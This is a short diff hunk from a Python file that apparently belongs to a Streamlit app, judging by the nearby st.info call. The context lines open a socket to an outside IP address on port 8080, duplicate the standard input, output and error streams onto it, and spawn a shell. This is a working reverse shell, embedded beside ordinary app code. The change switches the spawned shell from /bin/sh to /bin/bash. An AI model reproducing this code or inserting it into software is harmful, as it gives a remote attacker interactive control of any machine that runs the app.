@@ -273,7 +273,7 @@ s.connect(("44.204.28.36",8080))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
-pty.spawn("/bin/sh")
+pty.spawn("/bin/bash")
 
 st.info(
     """
